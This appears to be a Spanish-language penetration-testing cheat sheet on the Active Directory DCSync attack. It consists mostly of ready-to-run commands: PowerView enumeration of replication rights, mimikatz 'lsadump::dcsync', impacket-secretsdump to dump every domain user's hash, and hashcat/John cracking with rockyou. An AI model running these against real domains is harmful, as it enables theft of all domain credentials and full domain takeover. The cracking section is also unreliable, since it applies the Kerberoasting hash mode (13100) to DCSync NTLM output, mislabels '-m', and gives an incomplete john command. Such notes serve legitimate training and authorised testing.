# DCSync 

Tags: #AD #DCSync #Powershell #Windows #Mimikatz #Kali 

```bash 
En Bloodhound se pueden ver este tipo de usuarios en:
	- Find Principals with DCSync Rights 
```

```bash 
Si un usuario tiene la capacidad de DCSync significa que posee permisos de replicación sobre el dominio en Active Directory.

Requiere los derechos:
	- DS-Replication-Get-Changes
	- DS-Replication-Get-Changes-All
	- (opcional) DS-Replication-Get-Changes-In-Filtered-Set

¿Qué permite?
	- Extraer hashes NTLM
	- Obtener claves Kerberos
	- Replicar credenciales (incluido krbtgt)

Impacto
Compromiso total del dominio, ya que permite extraer secretos directamente del Domain Controller sin ejecutar código en él.
```

## Reconocimiento en Powershell 

```powershell 
# Utilizar PowerView para buscar de todas las ACLs del dominio aquellas ACLs cuyo campo 'ObjectAceType' haga match con 'DS-Replication-Get-Changes' y ver el nombre 
❯ Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select ObjectDN,ObjectAceType,@{name="Name";expression={Convert-SidToName $_.SecurityIdentifier}}


El objeto debe de tener las siguientes ACE para efectuar un DCSync:
- DS-Replication-Get-Changes-In-Filtered-Set
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All 
```

## Mimikatz en Windows 

```powershell  
Para poder usar correctamente herramientas como 'Mimikatz' en un sistema 'Microsoft Windows', no basta con conocer las credenciales de un usuario comprometido; es necesario que ese usuario haya iniciado sesión en el equipo, ya que la autenticación interactiva genera un _logon session_, crea su _access token_ y carga su material de autenticación en memoria (LSASS). Si el equipo está unido a 'Active Directory', también se establecerán sus contextos Kerberos/NTLM contra el dominio. Sin una sesión autenticada activa, no existirán credenciales ni tokens en memoria que puedan ser extraídos o abusados. 

Por lo tanto, se debe iniciar sesión con el usuario comprometido en Windows.
```

* [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

```bash 
Descargar mimikatz 'mimikatz_trunk.zip' desde el enlace de arriba y pasar '/mimikatz_trunk/x64/mimikatz.exe' a la máquina Windows con el usuario comprometido 
```

```powershell 
# Utilizar mimikatz para hacer el ataque de DCSync 
❯ .\mimikatz.exe       # Ejecutar la herramienta y después ejecutar funciones 
	❯ lsadump::dcsync /user:domain\administrator       # Obtener el hash NTLM de un usuario en específico en el dominio 
```

## Impacket en Kali 

```bash 
❯ impacket-secretsdump -just-dc user2:"password"@IP_DC    # Obtener todos los hashes NTLM de todos los usuarios en el dominio 
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 13100 hash-kerberoasting /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 13100 = TGS de un Kerberoasting
	# hash-kerberoasting = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```

```bash 
# Guardar y crackear el hash con 'John The Ripper'
❯ john --format=NT hash-kerberoasting /usr/share/wordlists/rockyou.txt
```